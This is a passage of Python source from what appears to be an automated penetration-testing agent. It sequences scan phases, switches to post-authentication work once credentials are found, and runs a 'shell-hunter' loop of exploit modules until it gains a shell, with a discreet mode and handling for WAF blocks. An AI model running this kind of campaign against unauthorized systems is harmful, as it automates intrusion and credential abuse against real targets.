            remaining = max_modules - len(executed_paths)
            if remaining <= 0:
                break
            phase_modules = self._prune_modules_for_primary_cms(
                phase_modules,
                state.knowledge_base,
            )
            kb_pre_phase = kb_light_copy(state.knowledge_base)
            selected = self._select_modules_opportunistic(
                phase_modules,
                state,
                tech_hints,
                executed_paths,
                min(budget, remaining),
            )
            if not selected:
                continue
            self._append_timeline_event(
                state,
                phase_name,
                f"Selected {len(selected)} module(s) for {phase_name} phase.",
                modules=selected,
                extra={"budget": min(budget, remaining)},
            )
            self._log_opportunistic_pick(
                phase_name, selected, state, tech_hints, set(executed_paths),
                candidate_pool=phase_modules,
            )
            snapshot_before = self._snapshot_campaign_state(state, all_results)
            if verbose:
                print_status(f"Phase {phase_name}: executing {len(selected)} module(s)")
            crawl_overrides = self._build_inferred_option_overrides(selected, state)
            if phase_name == "crawl":
                phase_results = self._execute_plan_modules_with_options(
                    selected,
                    state,
                    option_overrides=crawl_overrides,
                    verbose=verbose,
                )
            else:
                phase_results = self._execute_agent_modules(
                    state,
                    scanner,
                    selected,
                    state.target_info,
                    phase_threads,
                    False,
                    phase_name,
                )
            all_results.extend(phase_results)
            selected_paths = [m.get("path") for m in selected if m.get("path")]
            for module in selected:
                path = module.get("path")
                if path:
                    executed_paths.add(path)
            phase_hints = self._extract_tech_hints(phase_results)
            tech_hints.update(phase_hints)
            self._update_knowledge_base_from_results(
                state.knowledge_base,
                phase_results,
                selected_paths,
                phase_hints,
                set(),
            )
            self._record_module_performance_phase(state, kb_pre_phase, phase_results, phase_name)
            self._append_timeline_event(
                state,
                phase_name,
                f"{phase_name.capitalize()} phase completed.",
                modules=selected,
                results=phase_results,
            )
            if state.campaign_stop_reason:
                return self._finalize_scan_campaign(
                    state, modules, scanner, all_results, executed_paths, phase_threads, tech_hints,
                )
            if self._credential_milestone_reached(state.knowledge_base):
                return self._pivot_scan_campaign_after_credentials(
                    state,
                    modules,
                    scanner,
                    all_results,
                    executed_paths,
                    phase_threads,
                    tech_hints,
                    verbose,
                    phase_name,
                )
            stop_now, no_novelty_streak, stop_reason = self._evaluate_campaign_stop(
                phase_name,
                phase_results,
                snapshot_before,
                self._snapshot_campaign_state(state, all_results),
                no_novelty_streak,
                state,
            )
            if stop_now:
                state.campaign_stop_reason = stop_reason
                if verbose:
                    print_warning(f"Aggressive stop: {stop_reason}")
                break

        if state.campaign_stop_reason:
            return self._finalize_scan_campaign(
                state, modules, scanner, all_results, executed_paths, phase_threads, tech_hints,
            )

        # Injection phase is conditional to minimize noise and requests.
        specializations_pre = self._detect_specializations(tech_hints, all_results, state.knowledge_base)
        cms_lock_pre = self._get_cms_lock_specializations(state.knowledge_base, specializations_pre)
        cms_detected = bool(cms_lock_pre)
        if cms_detected:
            if verbose:
                print_status(
                    "Phase injection: skipped (CMS detected; preferring specialized follow-up modules)."
                )
        else:
            remaining = max_modules - len(executed_paths)
            if remaining > 0:
                inject_candidates = self._pick_injection_modules(modules, state.knowledge_base)
                kb_pre_inject = kb_light_copy(state.knowledge_base)
                inject_selected = self._select_modules_opportunistic(
                    inject_candidates,
                    state,
                    tech_hints,
                    executed_paths,
                    min(inject_budget, remaining),
                )
                if inject_selected:
                    self._append_timeline_event(
                        state,
                        "injection",
                        f"Selected {len(inject_selected)} targeted injection module(s).",
                        modules=inject_selected,
                        extra={"budget": min(inject_budget, remaining)},
                    )
                    self._log_opportunistic_pick(
                        "injection", inject_selected, state, tech_hints, set(executed_paths),
                        candidate_pool=inject_candidates,
                    )
                    snapshot_before = self._snapshot_campaign_state(state, all_results)
                    if verbose:
                        print_status(f"Phase injection: executing {len(inject_selected)} module(s)")
                    inject_results = self._execute_modules_targeted(
                        scanner,
                        inject_selected,
                        state,
                        verbose=verbose,
                    )
                    all_results.extend(inject_results)
                    selected_paths = [m.get("path") for m in inject_selected if m.get("path")]
                    for module in inject_selected:
                        path = module.get("path")
                        if path:
                            executed_paths.add(path)
                    inject_hints = self._extract_tech_hints(inject_results)
                    tech_hints.update(inject_hints)
                    self._update_knowledge_base_from_results(
                        state.knowledge_base,
                        inject_results,
                        selected_paths,
                        inject_hints,
                        set(),
                    )
                    self._record_module_performance_phase(state, kb_pre_inject, inject_results, "injection")
                    self._append_timeline_event(
                        state,
                        "injection",
                        "Injection phase completed.",
                        modules=inject_selected,
                        results=inject_results,
                    )
                    if self._credential_milestone_reached(state.knowledge_base):
                        return self._pivot_scan_campaign_after_credentials(
                            state,
                            modules,
                            scanner,
                            all_results,
                            executed_paths,
                            phase_threads,
                            tech_hints,
                            verbose,
                            "injection",
                        )
                    stop_now, no_novelty_streak, stop_reason = self._evaluate_campaign_stop(
                        "injection",
                        inject_results,
                        snapshot_before,
                        self._snapshot_campaign_state(state, all_results),
                        no_novelty_streak,
                        state,
                    )
                    if stop_now:
                        state.campaign_stop_reason = stop_reason
                        if verbose:
                            print_warning(f"Aggressive stop: {stop_reason}")
                        return self._finalize_scan_campaign(
                            state, modules, scanner, all_results, executed_paths, phase_threads, tech_hints,
                        )

        # Adaptive specialized pass (CMS/framework-specific) based on discovered hints.
        remaining = max_modules - len(executed_paths)
        if remaining > 0:
            specializations = self._detect_specializations(tech_hints, all_results, state.knowledge_base)
            specialized_pool = [m for m in modules if m.get("path") not in executed_paths]
            specialized_pool = self._prune_modules_for_primary_cms(
                specialized_pool,
                state.knowledge_base,
            )
            specialized_modules = self._pick_specialized_modules(
                specialized_pool,
                specializations,
                state.knowledge_base,
            )
            kb_pre_adaptive = kb_light_copy(state.knowledge_base)
            specialized_selected = self._select_modules_opportunistic(
                specialized_modules,
                state,
                tech_hints,
                executed_paths,
                min(specialized_budget, remaining),
            )
            if specialized_selected:
                self._append_timeline_event(
                    state,
                    "adaptive",
                    f"Selected {len(specialized_selected)} specialized module(s).",
                    modules=specialized_selected,
                    extra={"specializations": sorted(specializations)},
                )
                self._log_opportunistic_pick(
                    "adaptive", specialized_selected, state, tech_hints, set(executed_paths),
                    candidate_pool=specialized_modules,
                )
                snapshot_before = self._snapshot_campaign_state(state, all_results)
                if verbose:
                    print_status(
                        f"Phase adaptive: executing {len(specialized_selected)} specialized module(s) "
                        f"for {', '.join(specializations)}"
                    )
                specialized_results = self._execute_agent_modules(
                    state,
                    scanner,
                    specialized_selected,
                    state.target_info,
                    phase_threads,
                    verbose,
                    "adaptive",
                )
                all_results.extend(specialized_results)
                selected_paths = [m.get("path") for m in specialized_selected if m.get("path")]
                for module in specialized_selected:
                    path = module.get("path")
                    if path:
                        executed_paths.add(path)
                specialized_hints = self._extract_tech_hints(specialized_results)
                tech_hints.update(specialized_hints)
                self._update_knowledge_base_from_results(
                    state.knowledge_base,
                    specialized_results,
                    selected_paths,
                    specialized_hints,
                    specializations,
                )
                self._record_module_performance_phase(state, kb_pre_adaptive, specialized_results, "adaptive")
                self._append_timeline_event(
                    state,
                    "adaptive",
                    "Adaptive phase completed.",
                    modules=specialized_selected,
                    results=specialized_results,
                    extra={"specializations": sorted(specializations)},
                )
                if self._credential_milestone_reached(state.knowledge_base):
                    return self._pivot_scan_campaign_after_credentials(
                        state,
                        modules,
                        scanner,
                        all_results,
                        executed_paths,
                        phase_threads,
                        tech_hints,
                        verbose,
                        "adaptive",
                    )
                stop_now, no_novelty_streak, stop_reason = self._evaluate_campaign_stop(
                    "adaptive",
                    specialized_results,
                    snapshot_before,
                    self._snapshot_campaign_state(state, all_results),
                    no_novelty_streak,
                    state,
                )
                if stop_now:
                    state.campaign_stop_reason = stop_reason
                    if verbose:
                        print_warning(f"Aggressive stop: {stop_reason}")
                    return self._finalize_scan_campaign(
                        state, modules, scanner, all_results, executed_paths, phase_threads, tech_hints,
                    )
            state.scan_specializations = sorted(specializations)

        # Follow-up pass: when detections occur, chain auxiliary scanners/modules contextually.
        remaining = max_modules - len(executed_paths)
        if remaining > 0:
            followup_pool = [m for m in modules if m.get("path") not in executed_paths]
            followup_pool = self._filter_modules_for_cms_lock(
                followup_pool,
                state.knowledge_base,
                state.scan_specializations,
            )
            followup_pool = self._prune_modules_for_primary_cms(
                followup_pool,
                state.knowledge_base,
            )
            followup_modules = self._pick_followup_modules(
                all_results,
                followup_pool,
                state.knowledge_base,
            )
            kb_pre_followup = kb_light_copy(state.knowledge_base)
            followup_selected = self._select_modules_opportunistic(
                followup_modules,
                state,
                tech_hints,
                executed_paths,
                min(followup_budget, remaining),
            )
            if followup_selected:
                self._append_timeline_event(
                    state,
                    "follow-up",
                    f"Selected {len(followup_selected)} follow-up module(s).",
                    modules=followup_selected,
                    extra={"budget": min(followup_budget, remaining)},
                )
                self._log_opportunistic_pick(
                    "follow-up", followup_selected, state, tech_hints, set(executed_paths),
                    candidate_pool=followup_modules,
                )
                snapshot_before = self._snapshot_campaign_state(state, all_results)
                if verbose:
                    print_status(f"Phase follow-up: executing {len(followup_selected)} module(s)")
                followup_overrides = self._build_inferred_option_overrides(followup_selected, state)
                followup_results = self._execute_plan_modules_with_options(
                    followup_selected,
                    state,
                    option_overrides=followup_overrides,
                    verbose=verbose,
                )
                all_results.extend(followup_results)
                selected_paths = [m.get("path") for m in followup_selected if m.get("path")]
                for module in followup_selected:
                    path = module.get("path")
                    if path:
                        executed_paths.add(path)
                followup_hints = self._extract_tech_hints(followup_results)
                tech_hints.update(followup_hints)
                self._update_knowledge_base_from_results(
                    state.knowledge_base,
                    followup_results,
                    selected_paths,
                    followup_hints,
                    set(),
                    phase="follow-up",
                )
                self._record_module_performance_phase(state, kb_pre_followup, followup_results, "follow-up")
                self._append_timeline_event(
                    state,
                    "follow-up",
                    "Follow-up phase completed.",
                    modules=followup_selected,
                    results=followup_results,
                )
                for hint in state.knowledge_base.get("tech_hints", []) or []:
                    tech_hints.add(str(hint).lower())
                if self._credential_milestone_reached(state.knowledge_base):
                    return self._pivot_scan_campaign_after_credentials(
                        state,
                        modules,
                        scanner,
                        all_results,
                        executed_paths,
                        phase_threads,
                        tech_hints,
                        verbose,
                        "follow-up",
                    )
                stop_now, no_novelty_streak, stop_reason = self._evaluate_campaign_stop(
                    "follow-up",
                    followup_results,
                    snapshot_before,
                    self._snapshot_campaign_state(state, all_results),
                    no_novelty_streak,
                    state,
                )
                if stop_now:
                    state.campaign_stop_reason = stop_reason
                    if verbose:
                        print_warning(f"Aggressive stop: {stop_reason}")
                    return self._finalize_scan_campaign(
                        state, modules, scanner, all_results, executed_paths, phase_threads, tech_hints,
                    )

            post_auth_budget = min(12, max(3, max_modules - len(executed_paths)))
            if self._discreet_mode(state):
                post_auth_budget = min(5, max(2, max_modules - len(executed_paths)))
            self._run_post_auth_methodical_wave(
                state,
                modules,
                scanner,
                all_results,
                executed_paths,
                phase_threads,
                post_auth_budget,
            )
            for hint in state.knowledge_base.get("tech_hints", []) or []:
                tech_hints.add(str(hint).lower())
            if self._credential_milestone_reached(state.knowledge_base):
                return self._pivot_scan_campaign_after_credentials(
                    state,
                    modules,
                    scanner,
                    all_results,
                    executed_paths,
                    phase_threads,
                    tech_hints,
                    verbose,
                    "follow-up",
                )

        # Final targeted pass using collected hints.
        remaining = max_modules - len(executed_paths)
        if remaining > 0:
            targeted_pool = [m for m in modules if m.get("path") not in executed_paths]
            targeted_pool = self._filter_modules_for_cms_lock(
                targeted_pool,
                state.knowledge_base,
                state.scan_specializations,
            )
            targeted_pool = self._prune_modules_for_primary_cms(
                targeted_pool,
                state.knowledge_base,
            )
            targeted = self._rank_targeted_modules(
                targeted_pool,
                tech_hints,
                remaining,
                specializations=state.scan_specializations,
                knowledge_base=state.knowledge_base,
            )
            if targeted:
                self._append_timeline_event(
                    state,
                    "targeted",
                    f"Selected {len(targeted)} target-specific module(s).",
                    modules=targeted,
                    extra={"hints": sorted(tech_hints)[:8]},
                )
                kb_pre_targeted = kb_light_copy(state.knowledge_base)
                snapshot_before = self._snapshot_campaign_state(state, all_results)
                if verbose:
                    hints_display = ", ".join(sorted(tech_hints)) if tech_hints else "none"
                    print_status(f"Phase targeted: {len(targeted)} module(s), hints={hints_display}")
                targeted_results = self._execute_agent_modules(
                    state,
                    scanner,
                    targeted,
                    state.target_info,
                    phase_threads,
                    verbose,
                    "targeted",
                )
                all_results.extend(targeted_results)
                selected_paths = [m.get("path") for m in targeted if m.get("path")]
                for module in targeted:
                    path = module.get("path")
                    if path:
                        executed_paths.add(path)
                targeted_hints = self._extract_tech_hints(targeted_results)
                tech_hints.update(targeted_hints)
                self._update_knowledge_base_from_results(
                    state.knowledge_base,
                    targeted_results,
                    selected_paths,
                    targeted_hints,
                    set(),
                )
                self._record_module_performance_phase(state, kb_pre_targeted, targeted_results, "targeted")
                self._append_timeline_event(
                    state,
                    "targeted",
                    "Targeted phase completed.",
                    modules=targeted,
                    results=targeted_results,
                )
                if self._credential_milestone_reached(state.knowledge_base):
                    return self._pivot_scan_campaign_after_credentials(
                        state,
                        modules,
                        scanner,
                        all_results,
                        executed_paths,
                        phase_threads,
                        tech_hints,
                        verbose,
                        "targeted",
                    )
                stop_now, no_novelty_streak, stop_reason = self._evaluate_campaign_stop(
                    "targeted",
                    targeted_results,
                    snapshot_before,
                    self._snapshot_campaign_state(state, all_results),
                    no_novelty_streak,
                    state,
                )
                if stop_now:
                    state.campaign_stop_reason = stop_reason
                    if verbose:
                        print_warning(f"Aggressive stop: {stop_reason}")
                    return self._finalize_scan_campaign(
                        state, modules, scanner, all_results, executed_paths, phase_threads, tech_hints,
                    )

        return self._finalize_scan_campaign(
            state,
            modules,
            scanner,
            all_results,
            executed_paths,
            phase_threads,
            tech_hints,
        )

    def _is_soft_campaign_stop_reason(self, reason: Optional[str]) -> bool:
        """Non-terminal stops that shell-hunter finalization may override."""
        text = str(reason or "").lower()
        if not text:
            return False
        return any(
            token in text
            for token in (
                "low novelty",
                "no remaining shell pivots",
                "no pivot",
            )
        )

    def _is_hard_campaign_stop_reason(self, reason: Optional[str]) -> bool:
        """Terminal stops: WAF/policy/budget/unreachable — do not run shell-hunter macro."""
        text = str(reason or "").strip().lower()
        if not text:
            return False
        if self._is_soft_campaign_stop_reason(reason):
            return False
        hard_tokens = (
            "blocking/waf",
            "waf_or_blocking",
            "target_unreachable",
            "dry_run",
            "deadline_reached",
            "budget_exhausted",
            "request_budget_exhausted",
            "operator_cancelled",
            "phase_timeout",
            "profile blocks",
            "requires explicit",
            "requires approval",
            "excessive redirect",
            "rate-limit noise",
        )
        return any(token in text for token in hard_tokens)

    def _is_low_novelty_stop_reason(self, reason: Optional[str]) -> bool:
        return self._is_soft_campaign_stop_reason(reason) and "low novelty" in str(reason or "").lower()

    def _should_run_shell_hunter_finalization(self, state: AgentState) -> bool:
        if self._has_shell_milestone(state):
            return False
        if self._is_hard_campaign_stop_reason(state.campaign_stop_reason):
            return False
        return (
            is_shell_operator_goal(self._operator_campaign_goal(state))
            or bool(getattr(state, "shell_hunter", False))
        )

    def _finalize_scan_campaign(
        self,
        state: AgentState,
        modules,
        scanner,
        all_results: List[Any],
        executed_paths: set,
        phase_threads: int,
        tech_hints: set,
    ) -> List[Any]:
        """
        Central scan exit: classify stop reason, run shell-hunter macro when allowed.

        Soft stops (low novelty, no pivots) are cleared so obtain-shell can continue.
        Hard stops (WAF, policy, budget, unreachable) preserve ``campaign_stop_reason``.
        """
        verbose = bool(state.verbose)
        self._ingest_sessions_from_scan_results(state, all_results)
        pending_reason = state.campaign_stop_reason
        if pending_reason and self._is_soft_campaign_stop_reason(pending_reason):
            if verbose:
                print_info(
                    f"Soft campaign stop deferred to shell-hunter finalization: {pending_reason}"
                )
            state.campaign_stop_reason = None
        elif pending_reason and self._is_hard_campaign_stop_reason(pending_reason) and verbose:
            print_info(f"Hard campaign stop (shell-hunter skipped): {pending_reason}")

        if self._should_run_shell_hunter_finalization(state):
            all_results = self._run_shell_hunter_macro_wave(
                state,
                modules,
                scanner,
                all_results,
                executed_paths,
                phase_threads,
                tech_hints,
            )

        state.scan_tech_hints = sorted(tech_hints)
        state.scan_modules_executed = len(executed_paths)
        return all_results

    def _run_shell_hunter_macro_wave(
        self,
        state: AgentState,
        modules: List[Dict[str, Any]],
        scanner: ScannerCommand,
        all_results: List[Any],
        executed_paths: set,
        phase_threads: int,
        tech_hints: set,
    ) -> List[Any]:
        """
        Persistent obtain-shell loop after phased campaign.

        Runs strategic followups/exploits until shell, budget exhaustion, or hard stop (WAF).
        """
        if not (
            is_shell_operator_goal(self._operator_campaign_goal(state))
            or bool(getattr(state, "shell_hunter", False))
        ):
            return all_results
        if self._has_shell_milestone(state):
            return all_results

        if self._is_soft_campaign_stop_reason(state.campaign_stop_reason):
            state.campaign_stop_reason = None

        modules_by_path = {
            str(m.get("path", "")).strip(): m
            for m in modules or []
            if m.get("path")
        }
        max_modules = int(state.max_modules)
        verbose = bool(state.verbose)
        max_rounds = min(
            SHELL_HUNTER_MACRO_MAX_ROUNDS,
            max(1, max_modules - len(executed_paths)),
        )

        for round_idx in range(max_rounds):
            if self._has_shell_milestone(state):
                break
            if state.campaign_stop_reason and not self._is_soft_campaign_stop_reason(state.campaign_stop_reason):
                break
            if len(executed_paths) >= max_modules:
                break

            kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
            findings = list(state.vulnerable_results or state.contextual_findings or [])
            action = self._next_best_action_for_shell_goal(state, kb, findings) or {}
            path = str(action.get("path", "") or "").strip()
            action_type = str(action.get("type", "run_followup") or "run_followup").lower()

            if not path or path in executed_paths:
                path = ""
                for candidate in suggest_shell_plan_followups(
                    kb,
                    state,
                    self._catalog.discover_campaign_modules(expanded=True),
                ):
                    if candidate not in executed_paths:
                        path = candidate
                        action_type = (
                            "run_exploit"
                            if path.startswith(("exploit/", "exploits/"))
                            else "run_followup"
                        )
                        break
            if not path or path in executed_paths:
                break

            if self._module_block_reason_for_profile(state, path):
                executed_paths.add(path)
                continue
            mismatch = self._module_stack_mismatch_reason(path, kb)
            if mismatch:
                executed_paths.add(path)
                if verbose:
                    print_warning(f"Shell-hunter skip [{path}]: {mismatch}")
                continue

            kb_pre = kb_light_copy(kb)
            if verbose:
                print_status(f"Shell-hunter macro ({round_idx + 1}/{max_rounds}): {path}")

            if action_type == "run_exploit" and not state.no_exploit:
                self._execute_exploit_results_with_options(
                    [],
                    state.target_info,
                    state=state,
                    explicit_exploit_paths=[path],
                    verbose=verbose,
                )
                executed_paths.add(path)
                if isinstance(kb, dict):
                    observed = set(kb.get("observed_modules", []) or [])
                    observed.add(path)
                    kb["observed_modules"] = sorted(observed)
                if self._has_shell_milestone(state):
                    break
                continue

            module = modules_by_path.get(path)
            if not module:
                executed_paths.add(path)
                continue

            phase_results = self._execute_agent_modules(
                state,
                scanner,
                [module],
                state.target_info,
                phase_threads,
                False,
                "shell-hunter",
            )
            all_results.extend(phase_results)
            executed_paths.add(path)
            phase_hints = self._extract_tech_hints(phase_results)
            tech_hints.update(phase_hints)
            self._update_knowledge_base_from_results(
                state.knowledge_base,
                phase_results,
                [path],
                phase_hints,
                set(),
                phase="shell-hunter",
            )
            self._record_module_performance_phase(state, kb_pre, phase_results, "shell-hunter")
            self._append_timeline_event(
                state,
                "shell-hunter",
                f"Shell-hunter macro step {round_idx + 1}: {path}",
                modules=[module],
                results=phase_results,
            )
            if self._has_shell_milestone(state):
                break

        state.scan_modules_executed = len(executed_paths)
        return all_results

    def _probe_and_filter_live_derived_hosts(
        self,
        state: AgentState,
        hosts: List[str],
    ) -> List[str]:
        """HTTP probe derived candidates; keep live hosts sorted by subdomain priority."""
        if not hosts:
            return []
        from interfaces.command_system.builtin.agent.goal_planner import score_subdomain_host

        live_statuses = set(DERIVED_HOST_LIVE_STATUSES)
        ranked: List[Tuple[int, int, str]] = []

        for host in prioritize_subdomain_hosts(hosts):
            live_hits = 0
            for scheme in ("https", "http"):
                urls = [f"{scheme}://{host}{path}" for path in DERIVED_HOST_PROBE_PATHS]
                rows = self._http_probe_many(state, urls, timeout_s=3, read_bytes=1024)
                live_hits = sum(
                    1 for row in rows
                    if int(row.get("status") or 0) in live_statuses
                )
                if live_hits:
                    break
            if not live_hits:
                continue
            ranked.append((-score_subdomain_host(host), -live_hits, host))

        ranked.sort()
        live_hosts = [host for _, _, host in ranked]
        kb = state.knowledge_base
        if isinstance(kb, dict):
            kb["derived_host_probe"] = {
                "candidates": len(hosts),
                "live": len(live_hosts),
                "hosts": live_hosts[:24],
            }
        return live_hosts

    def _compute_adaptive_budgets(self, state: AgentState) -> Dict[str, int]:
        max_modules = int(state.max_modules)
        kb = state.knowledge_base
        confidence = kb.get("tech_confidence", {}) if isinstance(kb, dict) else {}
        info_score = information_score_kb(kb if isinstance(kb, dict) else {})
        endpoint_count = len((kb or {}).get("discovered_endpoints", []) or []) if isinstance(kb, dict) else 0
        hint_count = len((kb or {}).get("tech_hints", []) or []) if isinstance(kb, dict) else 0
        has_auth = self._has_authenticated_session(kb) or self._credential_milestone_reached(kb)
        auth_focus = self._should_prioritize_auth_surface(kb)
        exploit_pressure = self._has_exploit_pressure(state)
        cms_conf = max(
            float(confidence.get("wordpress", 0.0) or 0.0),
            float(confidence.get("drupal", 0.0) or 0.0),
            float(confidence.get("joomla", 0.0) or 0.0),
        )
        cms_high = cms_conf >= 0.75
        if self._discreet_mode(state):
            if exploit_pressure:
                return {
                    "recon": min(max_modules, max(2, max_modules // 8)),
                    "crawl": 0,
                    "inject": max(2, max_modules // 6),
                    "specialized": max(4, max_modules // 3),
                    "followup": max(5, max_modules // 3),
                }
            if has_auth:
                return {
                    "recon": min(max_modules, max(2, max_modules // 6)),
                    "crawl": 0,
                    "inject": max(1, max_modules // 10),
                    "specialized": max(4, max_modules // 3),
                    "followup": max(4, max_modules // 3),
                }
            if cms_high:
                return {
                    "recon": min(max_modules, 3),
                    "crawl": 0,
                    "inject": 0,
                    "specialized": max(4, max_modules // 3),
                    "followup": max(3, max_modules // 4),
                }
            if auth_focus:
                return {
                    "recon": min(max_modules, 3),
                    "crawl": 0,
                    "inject": 0,
                    "specialized": max(2, max_modules // 5),
                    "followup": max(4, max_modules // 3),
                }
            if info_score <= 4.0 and endpoint_count <= 2 and hint_count <= 2:
                return {
                    "recon": min(max_modules, 4),
                    "crawl": 1,
                    "inject": 1,
                    "specialized": max(2, max_modules // 5),
                    "followup": max(2, max_modules // 6),
                }
            return {
                "recon": min(max_modules, max(3, int(state.recon_modules))),
                "crawl": 0,
                "inject": 1,
                "specialized": max(3, max_modules // 4),
                "followup": max(3, max_modules // 5),
            }
        if exploit_pressure:
            return {
                "recon": min(max_modules, max(3, max_modules // 8)),
                "crawl": 0,
                "inject": max(4, max_modules // 3),
                "specialized": max(8, max_modules // 2),
                "followup": max(10, (max_modules * 3) // 5),
            }
        if has_auth:
            return {
                "recon": min(max_modules, max(3, max_modules // 6)),
                "crawl": max(1, max_modules // 12),
                "inject": max(2, max_modules // 8),
                "specialized": max(8, max_modules // 2),
                "followup": max(8, max_modules // 2),
            }
        if cms_high:
            return {
                "recon": min(max_modules, max(4, max_modules // 4)),
                "crawl": max(1, max_modules // 10),
                "inject": max(2, max_modules // 10),
                "specialized": max(8, max_modules // 2),
                "followup": max(6, max_modules // 3),
            }
        if auth_focus:
            return {
                "recon": min(max_modules, max(4, max_modules // 4)),
                "crawl": max(1, max_modules // 12),
                "inject": max(2, max_modules // 10),
                "specialized": max(5, max_modules // 4),
                "followup": max(8, max_modules // 3),
            }
        if info_score <= 4.0 and endpoint_count <= 2 and hint_count <= 2:
            return {
                "recon": min(max_modules, max(5, max_modules // 3)),
                "crawl": max(4, max_modules // 4),
                "inject": max(3, max_modules // 6),
                "specialized": max(3, max_modules // 6),
                "followup": max(4, max_modules // 5),
            }
        if info_score >= 18.0 or endpoint_count >= 18:
            return {
                "recon": min(max_modules, max(4, max_modules // 5)),
                "crawl": max(2, max_modules // 8),
                "inject": max(4, max_modules // 4),
                "specialized": max(6, max_modules // 3),
                "followup": max(6, max_modules // 3),
            }
        return {
            "recon": min(max_modules, max(4, int(state.recon_modules))),
            "crawl": max(3, max_modules // 5),
            "inject": max(8, max_modules // 2),
            "specialized": max(4, max_modules // 4),
            "followup": max(5, max_modules // 5),
        }

    def _get_cms_lock_specializations(self, knowledge_base, specializations=None):
        cms = set([str(x).lower() for x in (specializations or [])])
        cms = cms.intersection(set(CMS_LOCK_NAMES))
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        confidence = kb.get("tech_confidence", {}) or {}
        if float(confidence.get("wordpress", 0.0) or 0.0) >= 0.7:
            cms.add("wordpress")
        if float(confidence.get("drupal", 0.0) or 0.0) >= 0.7:
            cms.add("drupal")
        if float(confidence.get("joomla", 0.0) or 0.0) >= 0.7:
            cms.add("joomla")
        return cms

    def _filter_modules_for_cms_lock(self, modules, knowledge_base, specializations=None):
        cms_lock = self._get_cms_lock_specializations(knowledge_base, specializations)
        if not cms_lock:
            return modules

        cms_tokens = {
            "wordpress": ("wordpress", "wp_", "wp-", "xmlrpc", "wpjson", "wp_json", "wpvivid"),
            "drupal": ("drupal",),
            "joomla": ("joomla",),
        }
        common_safe_tokens = (
            "security_headers", "sensitive_files",
            "robots", "sitemap", "cors_misconfig", "csp_bypass",
            "admin_panel_detect", "debug_info_leak",
            # Auth surfaces must stay available under CMS lock (generic login != wrong CMS).
            "login_page_detector", "admin_login_bruteforce",
        )
        generic_fuzz_tokens = (
            "xss_scanner", "sqli_engine", "sql_injection", "sqli", "lfi_fuzzer", "ssrf_scanner",
            "xxe_scanner", "api_fuzzer", "fuzzer", "smuggling", "nodejs_injection", "django_sqli",
            "auxiliary/scanner/http/wordpress_scanner",
        )

        allowed = []
        for module in modules:
            path = str(module.get("path", "")).lower()
            if any(token in path for token in common_safe_tokens):
                allowed.append(module)
                continue
            cms_match = False
            for cms in cms_lock:
                if any(token in path for token in cms_tokens.get(cms, ())):
                    cms_match = True
                    break
            if cms_match:
                allowed.append(module)
                continue
            if any(token in path for token in generic_fuzz_tokens):
                continue
        return allowed

    def _get_primary_cms_focus(self, knowledge_base):
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        confidence = kb.get("tech_confidence", {}) or {}
        hints = set([str(x).lower() for x in kb.get("tech_hints", [])])

        cms_scores = {
            "wordpress": float(confidence.get("wordpress", 0.0) or 0.0),
            "drupal": float(confidence.get("drupal", 0.0) or 0.0),
            "joomla": float(confidence.get("joomla", 0.0) or 0.0),
        }
        if "wordpress" in hints:
            cms_scores["wordpress"] += 0.2
        if "drupal" in hints:
            cms_scores["drupal"] += 0.2
        if "joomla" in hints:
            cms_scores["joomla"] += 0.2

        winner = max(cms_scores, key=cms_scores.get)
        best = cms_scores[winner]
        second = max([v for k, v in cms_scores.items() if k != winner] or [0.0])
        # Dominant single-CMS mode: enough evidence and clear lead.
        if best >= 0.6 and (best - second) >= 0.2:
            return winner
        return None

    def _prune_modules_for_primary_cms(self, modules, knowledge_base):
        primary = self._get_primary_cms_focus(knowledge_base)
        if not primary:
            return modules

        banned_by_primary = {
            "wordpress": (
                "drupal", "joomla", "spa_scanner", "api_fuzzer", "graphql_detect",
                "nodejs_injection", "django_sqli",
            ),
            "drupal": (
                "wordpress", "joomla", "spa_scanner", "api_fuzzer", "graphql_detect",
            ),
            "joomla": (
                "wordpress", "drupal", "spa_scanner", "api_fuzzer", "graphql_detect",
            ),
        }
        allow_core_tokens = (
            "security_headers", "sensitive_files",
            "cors_misconfig", "csp_bypass",
            "login_page_detector", "admin_login_bruteforce",
        )
        primary_tokens = {
            "wordpress": ("wordpress", "wp_", "wp-", "xmlrpc"),
            "drupal": ("drupal", "sites/default"),
            "joomla": ("joomla", "administrator"),
        }

        filtered = []
        for module in modules:
            path = str(module.get("path", "")).lower()
            if any(token in path for token in allow_core_tokens):
                filtered.append(module)
                continue
            if any(token in path for token in primary_tokens.get(primary, ())):
                filtered.append(module)
                continue
            if any(token in path for token in banned_by_primary.get(primary, ())):
                continue
            filtered.append(module)
        return filtered

    def _snapshot_campaign_state(self, state: AgentState, all_results):
        kb = state.knowledge_base
        return {
            "endpoints": len(kb.get("discovered_endpoints", [])),
            "params": len(kb.get("discovered_params", [])),
            "hints": len(kb.get("tech_hints", [])),
            "vulns": len([r for r in all_results if r.get("vulnerable")]),
        }

    def _evaluate_campaign_stop(self, phase_name, phase_results, before, after, no_novelty_streak, state=None):
        novelty = (
            (after.get("endpoints", 0) - before.get("endpoints", 0))
            + (after.get("params", 0) - before.get("params", 0))
            + (after.get("hints", 0) - before.get("hints", 0))
            + (after.get("vulns", 0) - before.get("vulns", 0))
        )
        if novelty <= 0:
            no_novelty_streak += 1
        else:
            no_novelty_streak = 0

        status_codes = []
        waf_markers = 0
        for row in phase_results or []:
            if self._result_waf_signal(row):
                waf_markers += 1
            blob = " ".join([
                str(row.get("message", "")),
                str(row.get("details", "")),
            ]).lower()
            status_codes.extend([int(code) for code in HTTP_STATUS_IN_TEXT_RE.findall(blob)])

        novelty_limit = 1 if state is not None and self._discreet_mode(state) else 2
        exploit_pressure = self._has_exploit_pressure(state)
        if exploit_pressure and state is not None and not is_shell_operator_goal(self._operator_campaign_goal(state)):
            novelty_limit += 1
        if no_novelty_streak >= novelty_limit:
            kb = state.knowledge_base if state is not None and isinstance(state.knowledge_base, dict) else {}
            campaign_goal = self._operator_campaign_goal(state) if state is not None else ""
            defer, pivots = should_defer_shell_low_novelty_stop(
                kb,
                campaign_goal=campaign_goal,
                stack_mismatch_fn=self._module_stack_mismatch_reason if state is not None else None,
            )
            if defer:
                if state is not None and state.verbose and pivots:
                    print_status(
                        "Low novelty ignored (shell goal): "
                        + ", ".join(pivots[:5])
                    )
                return False, 0, ""
            if exploit_pressure and not is_shell_operator_goal(campaign_goal):
                return False, no_novelty_streak, ""
            stop_detail = f"{phase_name}: low novelty for {novelty_limit} consecutive phase(s)"
